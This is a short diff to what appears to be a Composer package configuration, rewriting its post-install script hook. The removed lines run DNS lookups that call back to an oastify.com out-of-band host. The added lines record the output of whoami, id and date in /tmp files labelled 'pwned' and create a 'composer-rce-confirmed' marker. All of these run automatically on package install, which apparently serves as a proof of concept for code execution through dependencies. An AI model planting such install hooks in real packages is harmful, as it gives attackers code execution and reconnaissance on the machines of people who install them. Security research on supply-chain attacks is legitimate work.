@@ -5,9 +5,10 @@
     },
     "scripts": {
         "post-install-cmd": [
-            "nslookup executed.3nr7po6eqvgm18c708ds4gzal1rsfj38.oastify.com",
-            "host confirmed.3nr7po6eqvgm18c708ds4gzal1rsfj38.oastify.com",
-            "dig success.3nr7po6eqvgm18c708ds4gzal1rsfj38.oastify.com"
+            "whoami > /tmp/pwned-user.txt",
+            "date > /tmp/pwned-timestamp.txt", 
+            "id > /tmp/pwned-privileges.txt",
+            "touch /tmp/composer-rce-confirmed"
         ]
     }
 }
